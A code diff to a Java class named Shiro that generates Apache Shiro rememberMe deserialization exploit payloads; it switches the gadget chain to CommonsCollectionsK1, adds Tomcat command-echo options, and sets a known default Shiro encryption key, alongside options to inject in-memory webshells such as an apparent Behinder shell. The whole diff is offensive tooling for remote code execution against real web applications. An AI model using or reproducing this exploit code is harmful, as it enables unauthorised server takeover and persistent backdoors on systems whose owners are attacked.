@@ -84,13 +84,13 @@ public class Shiro implements FramePayload {
 
 
     public static void main(String[] args) throws Exception {
-        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsBeanutils1");
+        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsCollectionsK1");
         ObjectPayload<?> gadgetpayload = gadgetClazz.newInstance();
 
-        List<String> echoList = Arrays.asList("TomcatEcho", "SpringEcho", "SpringEcho1", "TestClassLoad", "NoEcho");
+        List<String> echoList = Arrays.asList("TomcatEcho","TomcatEcho1","TomcatEcho2", "SpringEcho", "SpringEcho1", "TestClassLoad", "NoEcho");
         List<String> pluginList = Arrays.asList("InjectMemTool", "InjectMomBehinder", "InjectClassLoader");
 
-        String option = "TomcatEcho";
+        String option = "TomcatEcho2";
 
         Object template = null;
         Object chainObject = null;
@@ -106,7 +106,7 @@ public class Shiro implements FramePayload {
         if (template != null && !option.equals("KeyEcho")) {
             chainObject = gadgetpayload.getObject(template);
 
-            final String sendpayload = shiro.sendpayload(chainObject, "1QWLxg+NYmxraMoxAXu/Iw==");
+            final String sendpayload = shiro.sendpayload(chainObject, "kPH+bIxk5D2deZiIxcaaaA==");
             System.out.println(sendpayload);
         } else {
             final String sendpayload = shiro.sendpayload(DserUtil.principal, "kPH+bIxk5D2deZiIxcaaaA==");
